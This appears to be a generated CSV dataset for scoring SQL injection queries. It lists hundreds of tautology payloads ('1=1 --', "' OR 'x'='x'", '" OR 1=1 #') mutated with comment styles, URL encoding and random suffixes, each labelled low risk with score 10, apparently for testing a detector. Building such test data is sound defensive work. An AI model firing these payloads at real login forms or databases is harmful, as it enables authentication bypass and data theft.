Query,Risk Level,Expected Score
1=1 -- -- VAtbxDIdYm,low,10
1=1 -- # fSFlBkK,low,10
1=1 -- -- OOgEI,low,10
1=1 -- -- XRMOFNXPO /* test */,low,10
1=1	--	/*	test	*/	/*	test	*/,low,10
1=1	-- -- sBhgPCr,low,10
1=1 -- -- comment # gjWhVJc,low,10
1=1/**/-- # BafIfpyST,low,10
1=1 -- # NGEMdkNDW -- cFZBeG,low,10
1=1	--	#	mDXwATaQX -- comment,low,10
1=1+--+#+FcNoF+--+comment,low,10
1=1%20-- -- qvsyRWqqc,low,10
1=1+# # ViwnxExpD,low,10
1=1 -- -- lnNwccHhO,low,10
1=1/**/--/**/--/**/comment,low,10
1=1	--	--	comment -- comment,low,10
1=1/**/--/**/--/**/jbwmjcbj # MySQL comment,low,10
1=1 -- -- QcuMbJ # sKHoYDtMmR,low,10
1=1 -- -- COMMEnt -- lyLdDEuwW # MySQL comment,low,10
1=1 -- # MySQL comment /* test */,low,10
1=1/**/--/**/#/**/iGPSzdq,low,10
1=1/**/--/**//*/**/TEST/**/*/,low,10
1=1+--+#+mYsql+COMMENT,low,10
1=1/**/-- # RDLFMch,low,10
1=1%20--+--+CIGYNERQ,low,10
1=1 -- # MySQL comment -- taRXpFAQI,low,10
1=1	-- # ktwcs,low,10
1=1	--	#	xEkTQZCmc -- voUdYCDB,low,10
1=1 -- -- LTKyx,low,10
1=1%20# # APsFI,low,10
1=1%20-- /* TEST */ # MYSQL COMMENT,low,10
1=1 # -- comment # MySQL comment,low,10
1=1 -- -- HlSoNUjmzy -- fYpTQRis -- comment,low,10
1=1 -- # MySQL comment -- comment,low,10
1=1 -- /* test */ /* test */,low,10
1=1+#+/*+test+*/,low,10
1=1/**/-- # EWqVex -- lKwnKkbczj,low,10
1=1/**/# # MySQL comment,low,10
1=1 -- -- RuMhRKMWF,low,10
1=1 -- /* test */ # MySQL comment,low,10
1=1 -- -- COMMENT,low,10
1=1%20--%20/*%20test%20*/,low,10
1=1/**//**/--,low,10
1=1 -- -- Bnparlhp # MySQL comment,low,10
1=1	--	#	MySQL	comment,low,10
1=1+-- # fgUgLYtW # pJnOLLK,low,10
1=1/**/--/**/#/**/LZNtbdD/**/--/**/comment,low,10
1=1+--+/*+TEST+*/+#+MYSQL+COMMENT,low,10
1=1 -- -- WnCVpZy -- FyWrFji # MySQL comment,low,10
1=1 -- # MySQL comment -- oxDLgw -- comment,low,10
1=1 -- # DTazflzysV # GWTRx,low,10
1=1%20--%20/*%20TEST%20*/,low,10
1=1	#,low,10
1=1+--+--+smtgmdoy,low,10
1=1 # -- COMMENT,low,10
1=1	-- /* test */,low,10
1=1 -- /* test */ # UYXxLSc,low,10
1=1 -- -- lLuKDGOp # MySQL comment,low,10
1=1+-- -- comment /* test */,low,10
1=1 -- -- xrSPoX # uFNcvwr,low,10
1=1%20-- # MySQL comment,low,10
1=1 -- -- hEEFTFjHQk,low,10
1=1 -- -- comment -- kvnugx # mysql comment,low,10
1=1 -- -- immAngpYmx # NXpJaj,low,10
1=1+--+--+comment # MySQL comment,low,10
1=1 -- -- comment -- oIRZc,low,10
1=1 # # comment -- MUrPbyrbDL /* test */,low,10
1=1 -- -- oGchSIj -- comment,low,10
1=1 -- # mYsql COMMENT,low,10
1=1 -- # hBtra /* test */ # HXIAnyxthz /* test */,low,10
1=1	--	#	rtQIUseyv/**/--/**/xvLqHeJKvs,low,10
1=1/**/#/**/--/**/comment,low,10
1=1+-- -- pZSFuyTrzG # MySQL comment,low,10
1=1+# # mCciE /* test */ # MySQL comment,low,10
1=1	-- -- oizvqn,low,10
1=1 -- -- ygahxw /* test */,low,10
1=1	-- /* test */ -- comment,low,10
1=1 -- /* test */ # SIWDkC /* test */,low,10
1=1 -- # YEiAWz,low,10
1=1+-- -- comment,low,10
1=1 -- # mMnDKO,low,10
1=1%20--%20#%20mysql%20comment -- comment,low,10
1=1/**/#%20--%20comment,low,10
1=1 -- # WnTAWHsSsW,low,10
1=1 -- -- PHIDAVXR -- comment,low,10
1=1 -- # OsQAxZ -- DderhEOka,low,10
1=1	--	/*	TEsT	*/,low,10
1=1	#	/*	test	*/,low,10
1=1 -- /* TESt */,low,10
1=1 -- # qGdpDwp -- CoMMENt,low,10
1=1 -- # qXPjCGK,low,10
1=1%20--/**/#/**/ftVQcAZVg/**/--/**/comment,low,10
1=1+--+#+ZdUbZZjQf,low,10
1=1 -- # MYSQL COMMENT -- COMMENT,low,10
1=1+# /* test */ # ZSpvkjkkdH,low,10
1=1 # -- kdVPBoJdHR,low,10
1=1 -- -- WWkrYV,low,10
1=1  #  #  MySQL  comment,low,10
1=1+--/**/--/**/comment,low,10
1=1 -- # XxoVqYoixm # ZZMSA,low,10
1=1+--+#+SZAEfdCz,low,10
1=1 -- -- XkaxR # MySQL comment,low,10
1=1/**/# -- DZcjeRj,low,10
1=1 -- -- YfRqYLTnu # MySQL comment,low,10
1=1 -- # vkpzgwlapu -- hknweraoda,low,10
1=1 -- # vNHjM # nLJLGcq,low,10
1=1 -- -- CTofcgrwwo -- comment,low,10
1=1	-- # MySQL comment,low,10
1=1%20-- -- tFTIy,low,10
1=1%20-- -- TIIwxPCY -- ZXxDoe,low,10
1=1 -- -- comment # lxqwnJ,low,10
1=1+--+/*+test+*/,low,10
1=1 -- # MySqL cOmMent,low,10
1=1+-- /* test */,low,10
1=1/**/-- -- COMMENT,low,10
1=1 -- -- CMvqIMexEP -- UBAED,low,10
1=1 -- # MySQL comment # MySQL comment,low,10
1=1	--	#	TBDBZ /* TEST */,low,10
1=1/**/-- -- comment,low,10
1=1	--	#	hYzJsyhGy	--	comment,low,10
1=1	--	--	comment	#	MySQL	comment,low,10
1=1 -- # OPmWtRW,low,10
1=1/**/--%20--%20ZHWNPGZWNC,low,10
1=1%20#%20/*%20test%20*/,low,10
1=1 # # JNMur,low,10
1=1+--+--+jshleksfs+/*+test+*/,low,10
1=1 -- -- comment # MySQL comment,low,10
1=1/**/--/**/--/**/comment	#	GbdRV,low,10
1=1 -- -- comment # MySQL comment # MySQL comment,low,10
1=1%20# # MySQL comment -- arwqKuHKOa,low,10
1=1 -- -- iNZLEZ,low,10
1=1%20--%20--%20UQFTEOAL,low,10
1=1%20-- /* test */,low,10
1=1+#+#+comment+#+TWIzvfpN,low,10
1=1%20--%20#%20MySQL%20comment%20/*%20test%20*/,low,10
1=1 # /* test */,low,10
1=1	--	/*	TEST	*/,low,10
1=1%20--%20#%20nuCgUKibW -- rDsNqarKDf,low,10
1=1 -- -- commENT -- ahMytUtYVa,low,10
1=1	--	#	oyisgqrm,low,10
1=1%20--%20#%20dhfDBtzz,low,10
1=1 -- # QmDXhvFSs # oqexKEgq,low,10
1=1+--+--+WGNJQ,low,10
1=1/**/-- -- xEmhfTg,low,10
1=1/**/--%20--%20qiXHtqjY,low,10
1=1/**/-- -- sYcQItWQX # MySQL comment -- comment,low,10
1=1 -- # MfXSqVO # PrGyflmBu -- YuJTgYIdc,low,10
1=1	--	#	MySQL	comment -- comment,low,10
1=1/**/--/**/--/**/RKBQXAY,low,10
1=1	--	--	comment,low,10
1=1%20-- # mYsql COMMENT -- comment,low,10
1=1	--	#	VBEnQgGlK,low,10
1=1+-- # PgFDAWDaNB -- ZEcIV,low,10
1=1%20--%20--%20comment,low,10
1=1+--+--+MguUf,low,10
1=1/**/-- -- CMoJK # MxOjJ -- FOWLxGQh,low,10
1=1 -- -- pzZRoOMVA,low,10
1=1 -- # MySQL comment # MySQL comment -- comment -- kVewGlqSZa,low,10
1=1/**/--/**/#/**/zryihqxkn,low,10
1=1+--+#+mysql+comment,low,10
1=1 -- # vzkioUI,low,10
1=1%20--%20--%20nFhWvE,low,10
1=1%20#%20#%20IsdrPOPsRT,low,10
1=1+--+--+comment+--+XxwZBfo -- comment,low,10
1=1/**/--/**/#/**/MYSql/**/COMMENt,low,10
1=1 -- # pwxyoe -- comment,low,10
1=1 # # DWINSsE # DXMNv,low,10
1=1+--+--+comment,low,10
1=1 -- -- cOmMeNt,low,10
1=1	--/**/--/**/viHag,low,10
1=1 -- -- inqamh,low,10
1=1/**/-- -- SnARFsez,low,10
1=1	-- # MySQL comment # lDalWK,low,10
1=1+-- # MySQL comment # gEGOUGVfXy,low,10
1=1 -- /* test */ # oitSy /* test */,low,10
1=1%20-- -- comment -- RmtTK,low,10
1=1/**/--/**/#/**/MySQL/**/comment/**/#/**/uDiFodWki -- Gldayfmc,low,10
1=1%20--	--	comment # OMsjtOyHIx,low,10
1=1%20# /* test */,low,10
1=1+--+#+yRrsS,low,10
1=1%20-- # WuKrWCQ /* test */,low,10
1=1 # /* TEST */,low,10
1=1 -- -- comment /* test */,low,10
' OR 'x'='x',low,10
'%20OR%20'x'='x',low,10
"""%20OR%20""x""=""x""",low,10
' or 'X'='X',low,10
'%20OR%20'x'='x'%20--%20comment%20/*%20test%20*/,low,10
' or 'x'='x',low,10
' OR 'x'='x' # MySQL comment /* test */ -- comment,low,10
' OR 'x'='x' -- hFumfS,low,10
'%20OR%20'X'='X',low,10
' OR 'x'='x' # qCvIJTvMWi,low,10
' OR 'x'='x' # MySQL comment,low,10
'+OR+'x'='x'+/*+test+*/,low,10
' OR 'X'='X' /* TEST */,low,10
'+OR+'x'='x',low,10
' or 'X'='X' # DdFxTU,low,10
' OR 'x'='x' -- zuoNXdkqW,low,10
' OR 'x'='x' # MySQL comment /* test */,low,10
' OR 'X'='X' # LbIbQrSRu,low,10
' || 'x'='x',low,10
' or 'x'='x' /* test */,low,10
'/**/OR/**/'x'='x',low,10
' OR 'x'='x' -- HHycMZw,low,10
'+or+'x'='x',low,10
' OR 'X'='X',low,10
' OR 'x'='x' -- sXtZS,low,10
' OR 'x'='x' /* test */,low,10
'	OR	'x'='x' -- comment,low,10
' OR 'x'='x' /* test */ # comment,low,10
""" OR ""x""=""x"" -- eJQZDaYCR # SbasrBeyTw",low,10
'	or	'x'='x',low,10
""" OR ""x""=""x""",low,10
""" OR ""x""=""x"" -- VGrdMVwd",low,10
' OR 'x'='x' -- comment # MySQL comment,low,10
'+or+'X'='X',low,10
'/**/OR/**/'x'='x'/**//*/**/test/**/*/,low,10
' OR 'X'='X' -- NMJPYOBL,low,10
' or 'X'='x',low,10
'/**/OR/**/'X'='X',low,10
'/**/||/**/'X'='x',low,10
' OR 'X'='x',low,10
'	OR	'x'='x',low,10
""" or ""x""=""x""",low,10
' || 'x'='x' -- ZNSgFz,low,10
'+OR+'x'='x' # MySQL comment,low,10
""" OR ""X""=""X""",low,10
' OR 'X'='X' # UFDEMQMYA,low,10
"""  Or  ""x""=""X""",low,10
""" OR ""x""=""x"" # iDiJPALABP",low,10
'/**/OR/**/'x'='x'/**/#/**/HsXZlohCOB,low,10
'/**/||/**/'x'='x',low,10
' OR 'x'='x' # dmCZbZMFk,low,10
' or 'X'='X' # mYsql COMMENT,low,10
'  OR  'x'='x',low,10
'/**/OR/**/'x'='x' -- comment,low,10
'+OR+'x'='x'+#+MySQL+comment,low,10
""" || ""x""=""x""",low,10
'/**/OR/**/'x'='x'/**/--/**/FHRWTPV,low,10
' OR 'x'='x' -- SpVdcJ,low,10
'+or+'x'='x'+#+buhqt,low,10
' OR 'x'='x' -- zsANFGN,low,10
' Or 'X'='x' /* test */ -- gsdTuCU,low,10
'%20OR%20'x'='x'%20#%20mIOyODc,low,10
'%20or%20'x'='x',low,10
'+OR+'x'='x'+#+WURkeWqp,low,10
' OR 'X'='X' -- UJBARHMV,low,10
' OR 'x'='x' -- comment,low,10
' OR 'x'='x' -- COMMENT,low,10
'	OR	'X'='x',low,10
' OR 'x'='x' # MySQL comment -- HysYXuCoBR,low,10
' OR 'x'='x' # rOOSfmqyJ,low,10
'	or	'X'='X',low,10
"""  OR  ""x""=""x""",low,10
' Or 'X'='x' -- cOMment,low,10
' OR 'x'='x' -- comment # SKfcSaFMM,low,10
' OR 'x'='x' # zJswjbL # WVPbCH,low,10
' or 'x'='x' -- CoMMeNT /* test */,low,10
' or 'X'='X' /* TeSt */,low,10
'/**/OR/**/'x'='x' # MySQL comment,low,10
' OR 'x'='x' -- zIDTqCPi -- xbrQNIAy,low,10
' oR 'X'='x',low,10
' Or 'X'='x',low,10
' OR 'x'='x' -- comment -- comment -- HKClkCDzCb,low,10
' or 'x'='X',low,10
' OR 'x'='x' -- zOZVQ,low,10
' OR 'x'='x' -- WTqlOEaxq,low,10
' Or 'X'='X',low,10
""" Or ""x""=""X""",low,10
' OR 'x'='x' -- xJzeBS # MySQL comment,low,10
' OR 'x'='x' -- SWUbZlf,low,10
' Or 'x'='x',low,10
'%20OR%20'x'='x' -- comment,low,10
'%20OR%20'x'='x' -- ulZKoHsVc,low,10
'%20OR%20'x'='x' # MySQL comment,low,10
' OR 'x'='x' /* test */ # MySQL comment -- AvRPYGeJRU,low,10
'+oR+'X'='X',low,10
' or 'X'='X' # JJpqpXwo,low,10
'+or+'x'='x' # MySQL comment,low,10
' OR 'x'='x' -- WsRnvo,low,10
' OR 'x'='x' /* test */ # MySQL comment,low,10
' OR 'x'='X',low,10
'/**/or/**/'x'='x',low,10
' oR 'X'='x' # VSFNamBVkf,low,10
'%20OR%20'x'='x' -- HrQcVWHU,low,10
' OR 'x'='x' # SOATPynOK,low,10
'+or+'X'='X' # JZtbnllj,low,10
'	OR	'x'='x'	#	MySQL	comment,low,10
""" OR ""x""=""x"" -- IfVQc",low,10
""" || ""x""=""x"" -- comment",low,10
' OR 'x'='x' # rjeToxVci -- comment,low,10
'+OR+'X'='X',low,10
' OR 'x'='x' -- comment /* test */ # lBOso,low,10
' oR 'X'='X',low,10
' Or 'x'='X',low,10
' OR 'x'='x' -- UQfkyLjkeq,low,10
'+Or+'X'='x' # mysql ComMENt,low,10
'%20OR%20'x'='x'%20#%20MySQL%20comment,low,10
'	or	'X'='X'	#	mYsql	COMMENT,low,10
'/**/or/**/'x'='x' -- comment,low,10
' or 'X'='X' # MdBnwQD,low,10
'%20or%20'x'='X',low,10
'  OR  'x'='x'  #  dgIEXFZVf  --  USwvy,low,10
"""/**/||/**/""X""=""X""",low,10
' or 'x'='x' -- ebgwX,low,10
'+OR+'x'='x' -- comment,low,10
'	||	'X'='X'	#	OOTUV -- NgomTocFj,low,10
'	or	'x'='x'	#	WIpsHd,low,10
""" OR ""X""=""X"" -- COMMENT",low,10
""" OR ""x""=""x"" # MySQL comment",low,10
""" OR ""x""=""X""",low,10
""" or ""X""=""X""",low,10
'%20OR%20'x'='x' # MfuKzIFfVV -- QbgTJVPq,low,10
' or 'X'='X' # ZeMQJnqQ,low,10
"""/**/OR/**/""x""=""x"" -- AnmrSni",low,10
' || 'x'='x' # QtIHNvsHj,low,10
' OR 'X'='x' -- UvzUwo -- CoMMENT,low,10
'/**/OR/**/'X'='X'/**//*/**/TEST/**/*/,low,10
'	OR	'x'='x' /* test */,low,10
' OR 'x'='x' -- comment -- ruQRmwcZV -- comment,low,10
'	or	'x'='x' -- idahogpp -- comment,low,10
""" OR ""x""=""x"" # fNsVP -- PxhUN",low,10
'%20OR%20'x'='x' /* test */,low,10
'%20OR%20'X'='X'%20#%20MYSQL%20COMMENT -- klrAs,low,10
'	or	'x'='x'	#	mysql	comment # MySQL comment,low,10
'	||	'x'='x'	#	AvlntcW	--	fEChzfeCc,low,10
'%20OR%20'x'='x'%20#%20jhcWpVVu,low,10
' or 'x'='x' -- jbhgjwueac,low,10
'  OR  'x'='x' # ufoCiR,low,10
'/**/or/**/'x'='X',low,10
'%20Or%20'X'='X',low,10
' OR 'X'='X' /* TEST */ # MySQL comment,low,10
'+||+'x'='x',low,10
'+oR+'X'='x',low,10
'/**/OR/**/'x'='x' /* test */,low,10
' or 'X'='X' -- COMMENT -- HLoVbiWXW,low,10
"""	||	""x""=""x""	--	comment",low,10
' OR 'X'='X' /* test */,low,10
' OR 'x'='x' -- ElWMDFMRp /* test */,low,10
' oR 'x'='x' # MySqL cOMMent,low,10
"""+OR+""x""=""x""",low,10
' OR 'X'='X' -- COMMENT # MYSQL COMMENT,low,10
""" OR ""x""=""x"" -- comment",low,10
' || 'x'='x' # NHRYfcLrqq,low,10
"""/**/OR/**/""x""=""x""/**//*/**/test/**/*/",low,10
'	OR	'x'='x'	--	comment # MySQL comment,low,10
'+oR+'X'='x'+#+bLyWeuZMgD,low,10
'/**/OR/**/'x'='x'/**/#/**/ISEvg,low,10
'+OR+'x'='x' -- oextHvho,low,10
' OR 'X'='X' # BCQFVE,low,10
' OR 'x'='x' -- comment -- comment,low,10
'	OR	'X'='X',low,10
'%20||%20'x'='x',low,10
'+or+'X'='X'+--+iKdMfqC+#+mqPZO,low,10
' oR 'x'='x',low,10
'%20or%20'x'='x'%20#%20YwTKzc,low,10
' OR 'X'='X' # XCCHPH # MYSQL COMMENT,low,10
"""%20or%20""x""=""x""",low,10
' OR 'x'='x' # zhnOq # DAXUUdMRka,low,10
' OR 'x'='x' -- dBPRuwnxrh,low,10
' || 'X'='X' # MYSQL COMMENT,low,10
' or 'X'='X' # MySQL comment,low,10
'+OR+'x'='x' -- eXSjsUOIcp,low,10
' OR 'x'='x' # onwGaH -- comment,low,10
""" or ""X""=""X"" # MySQL comment",low,10
'%20oR%20'X'='X',low,10
"""	OR	""x""=""x"" -- HqgsVlNGs /* test */",low,10
'+OR+'x'='X',low,10
' or 'x'='x' -- hmbhsqjv,low,10
'%20||%20'x'='x' -- comment,low,10
""" OR ""x""=""x"" -- comment -- comment /* test */",low,10
'+OR+'x'='x'+#+MySQL+comment+#+IwxyidGWrT /* test */,low,10
"""	OR	""x""=""x""	#	rWULmTy",low,10
"""/**/oR/**/""x""=""x""",low,10
'  OR  'X'='X'  #  MYSQL  COMMENT,low,10
'	OR	'x'='x'%20/*%20test%20*/,low,10
"""%20OR%20""x""=""x""%20--%20cyBfbuqGV",low,10
' || 'X'='X',low,10
' OR 'X'='X' # mYsql COMMENT,low,10
"""/**/OR/**/""x""=""x""",low,10
'+Or+'X'='X',low,10
'/**/Or/**/'x'='X',low,10
'+OR+'x'='x'+--+SXKApM,low,10
' or 'X'='X' -- comment,low,10
' OR 'x'='x' -- LyxzPvR,low,10
""" OR ""x""=""x"" /* test */",low,10
' OR 'X'='X' # MySQL comment,low,10
'+or+'x'='x' -- DUHcNyGvbM,low,10
'/**/OR/**/'x'='x'/**/--/**/comment # MySQL comment,low,10
'/**/Or/**/'x'='X'/**//*/**/teST/**/*/,low,10
"""+OR+""x""=""x"" -- SFINAcna -- comment",low,10
'/**/||/**/'x'='x' -- fcktAZlhor,low,10
'%20OR%20'x'='x' # ttktdv,low,10
'+oR+'X'='X' -- comMeNT,low,10
'%20OR%20'X'='X'%20--%20UNWNBOGTYQ,low,10
' or 'X'='X' -- hNIWCMarLc # MYsqL coMmenT,low,10
'+OR+'x'='x'+/*+test+*/+#+jWZeWzrm,low,10
"""	or	""x""=""x""",low,10
'/**/OR/**/'X'='X'/**/--/**/COMMENT,low,10
' || 'X'='X' -- NXGYeOuB -- iEAPGOh,low,10
'/**/OR/**/'x'='x'/**/#/**/CSXvyCgSD,low,10
"""%20or%20""X""=""X""",low,10
'	OR	'x'='x' -- zgBdAN,low,10
"""	OR	""X""=""X""	#	MYSQL	COMMENT",low,10
' OR 'X'='X' # JCHhpcQDzq,low,10
'+OR+'x'='x'	#	BMsBXimUcE -- PPRTL,low,10
' or 'X'='X' -- COMMENT,low,10
""" or ""X""=""X"" -- lICPBP",low,10
' OR 'x'='x' -- EDXcCGkr -- comment -- comment,low,10
"""+OR+""x""=""x"" -- comment",low,10
"""/**/OR/**/""X""=""X""",low,10
'	OR	'x'='x'	#	ZFFVBD,low,10
' or 'x'='x' # mysql comment,low,10
'/**/OR/**/'x'='x' # HwTRT,low,10
' || 'x'='x' # SkrhmA /* test */ /* test */,low,10
' || 'X'='X' -- JOvNVo,low,10
'/**/OR/**/'x'='x'/**/#/**/GbGoLsNlJZ,low,10
'%20or%20'X'='X',low,10
' OR 'x'='x' # VDODEZadFi /* test */,low,10
"""	OR	""x""=""x""",low,10
' OR 'X'='X' -- COMMENT,low,10
' oR 'x'='X',low,10
"""%20OR%20""X""=""X""",low,10
' or 'X'='X' -- TtQPDXoUKL,low,10
'+OR+'x'='x'+--+comment,low,10
'+or+'X'='X' # mYsql COMMENT,low,10
'/**/or/**/'X'='X' # mYsql COMMENT,low,10
'/**/OR/**/'x'='x'/**/#/**/MySQL/**/comment,low,10
' || 'x'='X',low,10
'	Or	'x'='x'	#	gXPRpAXWPz	#	mysqL	CoMment # JSzQlDWIya,low,10
'+or+'X'='X'+--+eUARMWHkEH+#+nyutV,low,10
'%20OR%20'x'='x'%20--%20comment,low,10
""" OR 1=1 #",low,10
""" or 1=1 # # mysql comment",low,10
""" or 1=1 #",low,10
"""/**/or/**/1=1/**/#",low,10
"""%20OR%201=1%20#",low,10
""" || 1=1 #",low,10
""" OR 1=1 # # YvxOcP",low,10
""" OR 1=1 # -- TFGFyvEODQ",low,10
""" OR 1=1 # # ebuOOfAV /* test */",low,10
"""/**/||/**/1=1/**/#",low,10
""" OR 1=1 # -- zDLhhaoc -- comment",low,10
""" or 1=1 # -- comment",low,10
""" OR 1=1 # -- comment",low,10
"""/**/OR/**/1=1/**/#",low,10
"""+or+1=1+#",low,10
""" or 1=1 # # MySQL comment",low,10
""" OR 1=1 # /* test */",low,10
"""/**/OR/**/1=1/**/#/**//*/**/test/**/*//**/--/**/comment",low,10
""" OR 1=1 # # MySQL comment",low,10
""" oR 1=1 #",low,10
""" OR 1=1 # # OKXourvEv /* test */",low,10
""" OR 1=1 # -- KWxqxz",low,10
"""  OR  1=1  #",low,10
"""	or	1=1	#	--	comment",low,10
""" OR 1=1 # # gVKpPZBAS",low,10
""" OR 1=1 # -- JWtCdc",low,10
"""	OR	1=1	#",low,10
"""	OR	1=1	# -- comment",low,10
""" or 1=1 # /* TEST */",low,10
"""+OR+1=1+# -- FvKwOqSTE",low,10
""" OR 1=1 # -- ngJTufa",low,10
""" OR 1=1 # -- AUsYsdsmh /* test */",low,10
""" oR 1=1 # # jGAKOyGdN",low,10
"""	or	1=1	#",low,10
""" or 1=1 # -- COMMENT",low,10
""" OR 1=1 # -- ghJSCHNG # yFTtpO",low,10
"""  or  1=1  # # mYsql COMMENT",low,10
"""/**/OR/**/1=1/**/#/**/#/**/vIUeSlFZ",low,10
""" OR 1=1 # # xPydFlEb",low,10
""" || 1=1 # -- IAYICPQ",low,10
"""/**/OR/**/1=1/**/# # nXlEA",low,10
""" OR 1=1 # # UmiqTDZv",low,10
""" Or 1=1 #",low,10
"""/**/or/**/1=1/**/#/**/#/**/mysql/**/comment",low,10
"""/**/OR/**/1=1/**/# -- TOqQsatAr",low,10
""" or 1=1 # -- fhfke",low,10
"""+OR+1=1+#",low,10
""" || 1=1 # # uxNjKwUyD",low,10
"""+OR+1=1+#+#+MySQL+comment",low,10
""" OR 1=1 # -- UwLDSGLO",low,10
"""%20or%201=1%20#",low,10
"""+OR+1=1+#+#+ivEcmU",low,10
""" or 1=1 # -- NnLjaXnrqM",low,10
"""/**/OR/**/1=1/**/# -- TiJkKpkNct",low,10
""" OR 1=1 # -- xSZLp",low,10
""" OR 1=1 # -- cMjkhA",low,10
""" OR 1=1 # # xfXvVeLLD # NSMwvdp",low,10
""" or 1=1 # -- cOMMent",low,10
""" OR 1=1 # # UDAES",low,10
"""%20OR%201=1%20#%20--%20comment%20/*%20test%20*/",low,10
"""	||	1=1	#	--	llHfBdsgEa",low,10
"""/**/OR/**/1=1/**/# -- comment",low,10
""" OR 1=1 # -- KUVaU -- vHBsayZIIX",low,10
"""	||	1=1	# # Rmssbjyu",low,10
""" OR 1=1 # # suqhsdlbiO",low,10
"""	OR	1=1	#	--	comment",low,10
"""/**/OR/**/1=1/**/#/**/#/**/MySQL/**/comment",low,10
""" or 1=1 # # SIvmjAS",low,10
""" OR 1=1 # -- comment # NAOLpSqrv",low,10
"""%20OR%201=1%20# # SxnORYEPK",low,10
"""	||	1=1	#",low,10
""" OR 1=1 # # ZcUGhqa",low,10
""" Or 1=1 # # wEEpX",low,10
"""%20OR%201=1%20#%20#%20tvjVWcageC",low,10
""" OR 1=1 # # bSZfhzHCuq",low,10
"""+OR+1=1+# -- comment",low,10
""" OR 1=1 # -- dmVgWo",low,10
"""+OR+1=1+#+--+LnykrVoU",low,10
"""+OR+1=1+#+--+ZtvWycPZz",low,10
""" OR 1=1 # # MySQL comment /* test */",low,10
""" OR 1=1 # /* test */ -- DPzjPbOgjY",low,10
""" OR 1=1 # -- KQlqwd",low,10
"""+oR+1=1+#+#+AgPUEna",low,10
""" or 1=1 # /* test */",low,10
""" OR 1=1 # # LFtjs",low,10
"""/**/Or/**/1=1/**/#",low,10
""" OR 1=1 # -- NBNHghQE",low,10
"""%20or%201=1%20#%20/*%20TEST%20*/",low,10
"""+OR+1=1+#+#+oeBGo",low,10
"""	OR	1=1	# /* test */ -- hVihndUUcU",low,10
""" OR 1=1 # /* test */ -- comment /* test */",low,10
""" OR 1=1 # /* test */ # MySQL comment",low,10
"""+OR+1=1+#+--+uJpUilfPZ+--+GUpxIi+--+DgiGChyAzS",low,10
""" or 1=1 # # IQujMyxR",low,10
"""+OR+1=1+#+--+comment",low,10
"""%20||%201=1%20#",low,10
"""+||+1=1+#",low,10
""" or 1=1 # # mYsql COMMENT /* test */",low,10
""" OR 1=1 # # HJOwQNxvbE /* test */",low,10
""" oR 1=1 # # svSigJ -- FiEEo /* teSt */",low,10
"""+oR+1=1+#",low,10
"""	||	1=1	#/**/#/**/MySQL/**/comment",low,10
"""	OR	1=1	#	#	gYUlUtESR",low,10
""" OR 1=1 # # MySQL comment # JJhcvz",low,10
"""+OR+1=1+#+--+KLhrFcxd",low,10
"""+OR+1=1+#%20#%20PRyuc",low,10
"""	||	1=1	# /* test */",low,10
"""%20OR%201=1%20#%20--%20fnlhIlj",low,10
"""/**/OR/**/1=1/**/#/**/--/**/comment/**/--/**/MUdGfxc",low,10
""" or 1=1 # -- zfvpoliael",low,10
""" OR 1=1 # -- COMMENT -- comment",low,10
"""%20OR%201=1%20#/**/--/**/CQzvqqSrH # MySQL comment",low,10
""" OR 1=1 # -- FaUNIquD -- tsIbFQ /* test */",low,10
"""%20||%201=1%20# -- XjrLVBDiE",low,10
""" or 1=1 # # PpAbMH -- COMMENT",low,10
""" OR 1=1 # -- ORawjIbMIA -- EzACwQG",low,10
""" || 1=1 # -- elsgmpeeb # MySQL comment",low,10
""" or 1=1 # # rhapcfktj",low,10
""" OR 1=1 # -- eFhcC /* test */",low,10
"""%20OR%201=1%20#%20#%20MySQL%20comment",low,10
""" OR 1=1 # # ATKRm",low,10
"""	OR	1=1	#	--	AmvYBxD",low,10
"""+OR+1=1+# # lDtucG",low,10
"""	||	1=1	#	#	VXgPPBF",low,10
"""	OR	1=1	#	/*	test	*/ -- imJfKpNly",low,10
""" OR 1=1 # -- lYinRI -- comment # MySQL comment",low,10
""" || 1=1 # /* TEsT */ # FdiTdmxRJK",low,10
"""	oR	1=1	#",low,10
"""	or	1=1	# -- comment",low,10
""" OR 1=1 # # yakVfC -- bVvnMo /* test */",low,10
""" oR 1=1 # -- SexXGMEq /* test */",low,10
"""/**/OR/**/1=1/**/# -- bnBUnDkiIE",low,10
""" OR 1=1 # -- DJIUKZMCRJ",low,10
""" OR 1=1 # -- hAIXFGaALY",low,10
""" oR 1=1 # -- RUjkD",low,10
"""%20or%201=1%20# /* test */",low,10
"""/**/||/**/1=1/**/# -- azhKgU",low,10
""" OR 1=1 # # rqrHPWm # WfRvdrnMoR",low,10
""" OR 1=1 # -- tBLadWsRWQ # MySQL comment",low,10
"""%20OR%201=1%20#/**//*/**/test/**/*/",low,10
"""  OR  1=1  # # MySQL comment",low,10
